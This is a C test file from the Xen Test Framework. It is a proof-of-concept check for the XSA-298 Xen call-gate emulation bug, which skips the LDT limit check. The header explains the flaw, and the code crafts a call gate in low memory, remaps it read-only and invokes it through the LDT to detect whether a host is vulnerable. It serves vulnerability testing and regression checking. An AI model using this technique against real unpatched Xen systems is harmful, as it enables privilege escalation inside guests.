/**
 * @file tests/xsa-298/main.c
 * @ref test-xsa-298
 *
 * @page test-xsa-298 XSA-298
 *
 * Advisory: [XSA-298](https://xenbits.xen.org/xsa/advisory-298.html)
 *
 * The pv32 ABI allows the use of call gates, because in the days of 32bit
 * CPUs with 4 full rings of protection, they really did work.  When 64bit
 * CPUs came along, the use of call gates was restricted to only targeting
 * 64bit code segments.  Therefore, a 64bit Xen running a 32bit PV guest has
 * to emulate call gates to maintain the pv32 ABI.
 *
 * The emulation bug is that the LDT limit, as set by the kernel, isn't
 * respected.
 *
 * Crafty userspace can therefore use two properties of Xen:
 *
 * 1) LDT frames undergo type promotion on first use, rather than up-front at
 *    context switch time.
 * 2) The way a guest kernel indicates "no LDT" to Xen is to set its linear
 *    address to 0.
 *
 * and the common behaviour that no-one uses LDTs these days to escalate its
 * privileges into the guest kernel.
 *
 * It does so by writing a suitable looking gate somewhere in the range 0 to
 * 64k, remapping the gate as read-only (so it will successfully type
 * promote), then attempting to use the gate via the LDT.
 *
 * Xen's emulation skips the LDT limit check (which should be 0, and disallow
 * the LDT reference), finds a read-only frame which successfully promotes to
 * being a seg-desc frame, then proceeds to emulate the call itself.
 *
 * @see tests/xsa-298/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-298 PoC";

#define GATE_SEL (0x1000 | X86_SEL_LDT | 3)

unsigned int gate_target(void);
asm ("gate_target:;"
     "mov %cs, %eax;"
     __ASM_SEL(lretl, lretq)
    );

static void __user_text user1(void)
{
    env_gate *gate = _p(GATE_SEL & PAGE_MASK);

    pack_call_gate(gate, __KERN_CS, _u(&gate_target), 3, 0);
}

static unsigned long __user_text user2(void)
{
    /*
     * Don't put on the stack.  Some versions of Clang try to initialise it by
     * copying out of .rodata which is a supervisor mapping.
     */
    static far_ptr __user_data ptr = { .selector = GATE_SEL, };
    const char *vendor_ptr = _p(&ptr);
    unsigned int res = 0;

    if ( IS_DEFINED(CONFIG_64BIT) && vendor_is_amd )
        vendor_ptr += 4;

    asm volatile ("1:"
#ifdef __x86_64__
                  "rex64 "
#endif
                  "lcall *%[ptr]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+a" (res)
                  : [rec] "p" (ex_record_fault_eax),
                    [ptr] "m" (*vendor_ptr),
                    /* Pretend to read all of ptr, or it gets optimised away. */
                    "m" (ptr));

    return res;
}

static int remap_linear(const void *linear, uint64_t flags)
{
    intpte_t nl1e = pte_from_virt(linear, flags);

    return hypercall_update_va_mapping(_u(linear), nl1e, UVMF_INVLPG);
}

void test_main(void)
{
    env_gate *gate = _p(GATE_SEL & PAGE_MASK);
    unsigned int res;

    /*
     * Prepare userspace memory.
     */
    void *volatile /* GCC issue 99578 */ ptr = gate;
    memset(ptr, 0, PAGE_SIZE);
    remap_linear(gate, PF_SYM(AD, U, RW, P));

    /*
     * Simulate a piece of userspace making the attack, with an
     * mprotect(PROT_READ) syscall in the middle.
     */
    exec_user_void(user1);
    remap_linear(gate, PF_SYM(AD, U, P));
    res = exec_user(user2);

    /*
     * Interpret the result.  Successful use of the call gate should return
     * the running %cs, while a fixed Xen should fail the far call with a #GP
     * fault.
     */
    switch ( res )
    {
    case __KERN_CS:
        return xtf_failure("Fail: vulnerable to XSA-298\n");

    case EXINFO_SYM(GP, GATE_SEL & ~X86_SEL_RPL_MASK):
        return xtf_success("Success: Not vulnerable to XSA-298\n");

    default:
        return xtf_failure("Fail: Unexpected return value %#x\n", res);
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
